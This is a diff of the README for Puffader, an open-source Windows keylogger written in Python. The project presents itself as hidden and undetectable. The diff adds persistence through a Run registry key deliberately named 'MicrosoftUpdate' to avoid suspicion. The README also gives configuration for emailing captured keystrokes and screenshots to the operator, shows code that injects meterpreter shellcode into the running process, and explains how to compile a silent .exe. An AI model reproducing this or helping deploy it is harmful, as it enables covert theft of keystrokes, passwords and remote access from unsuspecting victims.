@@ -1,5 +1,3 @@
-# CURRENTLY WORK-IN PROGESS, PLEASE REFRAIN FROM USING CURRENT BUILD
-
 [![Build status](https://ci.appveyor.com/api/projects/status/5tc6085mmmw6rym8?svg=true)](https://ci.appveyor.com/project/xp4xbox/puffader)
 # Puffader
 Puffader is an opensource, hidden and undetectable keylogger for windows written in Python 2.7 which can also capture screenshots and mouse window clicks.
@@ -29,13 +27,14 @@ Currently Puffader has several features such as:
 * Ability to log special characters.
 * Ability to embed an undetectable meterpreter shell
 * Ability to capture window mouse clicks
+* Ability to run at startup
 * Checking for multiple instances
 * And more...
 
 ## Quick Usage
 
 1. Open file with idle or any other editor.
-2. Modifiy lines `22-45` for your personal preference: eg.
+2. Modifiy lines `22-47` for your personal preference: eg.
 ```
 strEmailAc = "email@gmail.com"
 strEmailPass = "pass"
@@ -61,20 +60,25 @@ blnBackRemove = "True"
 blnScrShot = "True"
 strScrDir = "c:/temp"
 intScrTime = 120
+
+blnAddToStartup = "False"
 ```
 > NOTE: For `strScrDir`, be sure to leave out the last `/`.
 
 #### If you plan to send messages via email, be sure to [allow access for less secure apps](https://myaccount.google.com/lesssecureapps) in your gmail account.
+
+#### If you ever want to remove the program from startup, open regedit and navigate to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` and delete the value `MicrosoftUpdate`. I gave it non-suspicious name on purpose.
 
 For more information please refer to the [wiki](https://github.com/xp4xbox/Puffader/wiki/Usage).
 
 ### Compiling Program To .exe
 
 #### Py2Exe
-1. (Optional) Add this code to Puffader.py `sys.stderr = None` after the import statements to ensure no errors will show.
+1. **(Optional)** Add this code to Puffader.py `sys.stderr = None` after the import statements to ensure no errors will show.
 2. Install [Py2Exe](https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/).
 3. Make sure the program is called Puffader.py in your python folder as well.
 4. Run `python setup.py`
+5. You should see the .exe in the dist folder.
 
 Or refer to the [wiki](https://github.com/xp4xbox/Puffader/wiki/Compiling-To-.exe) for more information.
 
@@ -93,7 +97,7 @@ pid = os.getpid()  # get current pid
 
 code_injector.InjectShellCode(pid, shellcode)  # inject the shellcode into the program
 ```
-5. Build program with Py2Exe using [setup.py](https://github.com/xp4xbox/Puffader/blob/master/Meterpreter_Plugin/setup.py) to compile the program to single .exe.
+5. Build program with Py2Exe.
 
 > Check my other project [PyEvade](https://github.com/xp4xbox/PyEvade) for more info on how this works.
 
